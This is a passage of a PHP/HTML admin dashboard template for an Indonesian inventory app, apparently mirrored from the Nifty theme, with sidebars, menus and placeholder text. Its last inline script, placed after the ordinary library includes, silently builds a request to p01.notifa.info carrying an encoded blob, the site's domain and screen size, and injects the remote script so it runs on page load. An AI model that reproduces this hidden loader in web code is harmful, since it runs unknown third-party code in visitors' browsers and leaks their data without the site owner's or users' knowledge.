							                </div>
							                <div class="media-body">
							                    <p class="mar-no text-main">Samantha Reid</p>
							                    <small class="text-muteds">Offline</small>
							                </div>
							            </a>
                                    </div>

                                    <hr>
                                    <p class="pad-all text-main text-sm text-uppercase text-bold">
                                        <span class="pull-right badge badge-success">Offline</span> Friends
                                    </p>

                                    <!--Works-->
                                    <div class="list-group bg-trans">
                                        <a href="#" class="list-group-item">
                                            <span class="badge badge-purple badge-icon badge-fw pull-left"></span> Joey K. Greyson
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <span class="badge badge-info badge-icon badge-fw pull-left"></span> Andrea Branden
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <span class="badge badge-success badge-icon badge-fw pull-left"></span> Johny Juan
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <span class="badge badge-danger badge-icon badge-fw pull-left"></span> Susan Sun
                                        </a>
                                    </div>


                                    <hr>
                                    <p class="pad-all text-main text-sm text-uppercase text-bold">News</p>

                                    <div class="pad-hor">
                                        <p>Lorem ipsum dolor sit amet, consectetuer
                                            <a data-title="45%" class="add-tooltip text-semibold text-main" href="#">adipiscing elit</a>, sed diam nonummy nibh. Lorem ipsum dolor sit amet.
                                        </p>
                                        <small><em>Last Update : Des 12, 2014</em></small>
                                    </div>


                                </div>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--End first tab (Contact list)-->


                                <!--Second tab (Custom layout)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <div class="tab-pane fade" id="demo-asd-tab-2">

                                    <!--Monthly billing-->
                                    <div class="pad-all">
                                        <p class="pad-ver text-main text-sm text-uppercase text-bold">Billing &amp; reports</p>
                                        <p>Get <strong class="text-main">$5.00</strong> off your next bill by making sure your full payment reaches us before August 5, 2018.</p>
                                    </div>
                                    <hr class="new-section-xs">
                                    <div class="pad-all">
                                        <span class="pad-ver text-main text-sm text-uppercase text-bold">Amount Due On</span>
                                        <p class="text-sm">August 17, 2018</p>
                                        <p class="text-2x text-thin text-main">$83.09</p>
                                        <button class="btn btn-block btn-success mar-top">Pay Now</button>
                                    </div>


                                    <hr>

                                    <p class="pad-all text-main text-sm text-uppercase text-bold">Additional Actions</p>

                                    <!--Simple Menu-->
                                    <div class="list-group bg-trans">
                                        <a href="#" class="list-group-item"><i class="demo-pli-information icon-lg icon-fw"></i> Service Information</a>
                                        <a href="#" class="list-group-item"><i class="demo-pli-mine icon-lg icon-fw"></i> Usage Profile</a>
                                        <a href="#" class="list-group-item"><span class="label label-info pull-right">New</span><i class="demo-pli-credit-card-2 icon-lg icon-fw"></i> Payment Options</a>
                                        <a href="#" class="list-group-item"><i class="demo-pli-support icon-lg icon-fw"></i> Message Center</a>
                                    </div>


                                    <hr>

                                    <div class="text-center">
                                        <div><i class="demo-pli-old-telephone icon-3x"></i></div>
                                        Questions?
                                        <p class="text-lg text-semibold text-main"> (415) 234-53454 </p>
                                        <small><em>We are here 24/7</em></small>
                                    </div>
                                </div>
                                <!--End second tab (Custom layout)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


                                <!--Third tab (Settings)-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <div class="tab-pane fade" id="demo-asd-tab-3">
                                    <ul class="list-group bg-trans">
                                        <li class="pad-top list-header">
                                            <p class="text-main text-sm text-uppercase text-bold mar-no">Account Settings</p>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-1" type="checkbox" checked>
                                                <label for="demo-switch-1"></label>
                                            </div>
                                            <p class="mar-no text-main">Show my personal status</p>
                                            <small class="text-muted">Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</small>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-2" type="checkbox" checked>
                                                <label for="demo-switch-2"></label>
                                            </div>
                                            <p class="mar-no text-main">Show offline contact</p>
                                            <small class="text-muted">Aenean commodo ligula eget dolor. Aenean massa.</small>
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-3" type="checkbox">
                                                <label for="demo-switch-3"></label>
                                            </div>
                                            <p class="mar-no text-main">Invisible mode </p>
                                            <small class="text-muted">Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. </small>
                                        </li>
                                    </ul>


                                    <hr>

                                    <ul class="list-group pad-btm bg-trans">
                                        <li class="list-header"><p class="text-main text-sm text-uppercase text-bold mar-no">Public Settings</p></li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-4" type="checkbox" checked>
                                                <label for="demo-switch-4"></label>
                                            </div>
                                            Online status
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-5" type="checkbox" checked>
                                                <label for="demo-switch-5"></label>
                                            </div>
                                            Show offline contact
                                        </li>
                                        <li class="list-group-item">
                                            <div class="pull-right">
                                                <input class="toggle-switch" id="demo-switch-6" type="checkbox" checked>
                                                <label for="demo-switch-6"></label>
                                            </div>
                                            Show my device icon
                                        </li>
                                    </ul>



                                    <hr>

                                    <p class="pad-hor text-main text-sm text-uppercase text-bold mar-no">Task Progress</p>
                                    <div class="pad-all">
                                        <p class="text-main">Upgrade Progress</p>
                                        <div class="progress progress-sm">
                                            <div class="progress-bar progress-bar-success" style="width: 15%;"><span class="sr-only">15%</span></div>
                                        </div>
                                        <small>15% Completed</small>
                                    </div>
                                    <div class="pad-hor">
                                        <p class="text-main">Database</p>
                                        <div class="progress progress-sm">
                                            <div class="progress-bar progress-bar-danger" style="width: 75%;"><span class="sr-only">75%</span></div>
                                        </div>
                                        <small>17/23 Database</small>
                                    </div>

                                </div>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--Third tab (Settings)-->

                            </div>
                        </div>
                    </div>
                </div>
            </aside>
            <!--===================================================-->
            <!--END ASIDE-->

            
             <!--MAIN NAVIGATION-->
            <!--===================================================-->
            <nav id="mainnav-container">
                <div id="mainnav">



                    <!--Menu-->
                    <!--================================-->
                    <div id="mainnav-menu-wrap">
                        <div class="nano">
                            <div class="nano-content">

                                <!--Profile Widget-->
                                <!--================================-->
                                <div id="mainnav-profile" class="mainnav-profile">
                                    <div class="profile-wrap text-center">
                                        <div class="pad-btm">
                                            <img class="img-circle img-md" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/1.png" alt="Profile Picture">
                                        </div>
                                        <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                            <span class="pull-right dropdown-toggle">
                                                <i class="dropdown-caret"></i>
                                            </span>
                                            <p class="mnp-name">Aaron Chavez</p>
                                            <span class="mnp-desc">aaron.cha@themeon.net</span>
                                        </a>
                                    </div>
                                    <div id="profile-nav" class="collapse list-group bg-trans">
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-male icon-lg icon-fw"></i> View Profile
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-gear icon-lg icon-fw"></i> Settings
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-information icon-lg icon-fw"></i> Help
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
                                        </a>
                                    </div>
                                </div>


                                <!--Shortcut buttons-->
                                <!--================================-->
                                <div id="mainnav-shortcut" class="hidden">
                                    <ul class="list-unstyled shortcut-wrap">
                                    	
                                        <li class="col-xs-3" data-content="My Profile">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
                                                <i class="demo-pli-male"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Messages">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-warning">
                                                <i class="demo-pli-speech-bubble-3"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Activity">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-success">
                                                <i class="demo-pli-thunder"></i>
                                                </div>
                                            </a>
                                        </li>
                                        <li class="col-xs-3" data-content="Lock Screen">
                                            <a class="shortcut-grid" href="#">
                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-purple">
                                                <i class="demo-pli-lock-2"></i>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <!--================================-->
                                <!--End shortcut buttons-->


                                <ul id="mainnav-menu" class="list-group">
									
						            <!--Category name-->
						            <li class="list-header">Navigation</li>
						
						            <!--Menu list item-->
						            <li>
						                <a href="<?= base_url().'Dashboard' ?>">
						                    <i class="demo-pli-gear"></i>
						                    <span class="menu-title">
												Beranda
											</span>
						                </a>
						            </li>

						            <li class="active-sub">
						                <a href="#">
						                    <i class="demo-pli-home"></i>
						                    <span class="menu-title">Barang</span>
											<i class="arrow"></i>
						                </a>
						
						                <!--Submenu-->
						                <ul class="collapse in">
						                    <li class="active-link"><a href="index.html">Tambah Barang</a></li>
											<li><a href="dashboard-2.html">Riwayat Barang</a></li>
											<li><a href="dashboard-3.html">Data Barang</a></li>
											<li><a href="dashboard-4.html">Barang Ready</a></li>
											
						                </ul>
						            </li>
						
						            <!--Menu list item-->
						            <li>
						                <a href="#">
						                    <i class="demo-pli-split-vertical-2"></i>
						                    <span class="menu-title">Pegawai</span>
											<i class="arrow"></i>
						                </a>
						
						                <!--Submenu-->
						                <ul class="collapse">
						                    <li><a href="<?php echo base_url('Dashboard/pegawai') ?>">Data Pegawai</a></li>
											
											
						                </ul>
						            </li>
						
						            <!--Menu list item-->
						            <li>
						                <a href="widgets.html">
						                    <i class="demo-pli-gear"></i>
						                    <span class="menu-title">
												Kritik & Saran
												<span class="pull-right badge badge-warning">24</span>
											</span>
						                </a>
						            </li>
						

                            </div>
                        </div>
                    </div>
                    <!--================================-->
                    <!--End menu-->

                </div>
            </nav>

            <!--===================================================-->
            <!--END MAIN NAVIGATION-->

        </div>

        

        <!-- FOOTER -->
        <!--===================================================-->
        <footer id="footer">

            <!-- Visible when footer positions are fixed -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="show-fixed pad-rgt pull-right">
                You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
            </div>



            <!-- Visible when footer positions are static -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
     <!--       <div class="hide-fixed pull-right pad-rgt">
                14GB of <strong>512GB</strong> Free.
            </div>

	-->

            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->

            <p class="pad-lft">&#0169; </p>



        </footer>
        <!--===================================================-->
        <!-- END FOOTER -->


        <!-- SCROLL PAGE BUTTON -->
        <!--===================================================-->
        <button class="scroll-top btn">
            <i class="pci-chevron chevron-up"></i>
        </button>
        <!--===================================================-->
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->


    
    
    
    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/nifty.min.js"></script>




    <!--=================================================-->
    
    <!--Demo script [ DEMONSTRATION ]-->
  <!--  <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->

    
    <!--DataTables [ OPTIONAL ]-->
    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/jquery.dataTables.js"></script>
	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>


    <!--DataTables Sample [ SAMPLE ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/demo/tables-datatables.js"></script>


    

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUaxQDkkXsQ40smKLX5MuTaP3Hz7CQx99v6v04x8tXILLzaJOlxMW8AqYZK7vJBQ0GeroIrDmsgRoQd3TbDcKFg5ZBqSJkgONBJfmihZkKwZm6n6A8yUgj4nkx3jY0LDUaUhTTSVo18zAU71F%2bg%2fz9XJK7mEBwuR9UbbQUNbpeu8TLlTGwc%2bJ8Q4Ghvlq5a3uLs3tGbSqe%2bIMGFB42NllBOXiUa%2fJS3C%2f4xtm2qCm0o76VDiUn%2fJU4E2PfPUP5k8Q8kqhOs%2f%2fJYJ%2b5E9CA9qTuBEo6UMsqrPZvthp0Oykb75Uu2OV1Q22Y539wDCdiCo%2fWdq8fte8WqybYrW7iOvpOtmuE9ypRwL6%2b5gbKpaecKP8gA8490c03k5TAyLvuWRxyhxBbA0sZtkm3%2b8dHg4FAjhTkRhGG4SmpBOqFSR9NOOtxN2dE8rtluoiMR%2fABnnWziDQHZS%2bjsuB5P1ZZS9wUjx%2bBZgxi5uazzR7I6vPu%2fVdNPdhxC%2fcET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:10 GMT -->
</html>

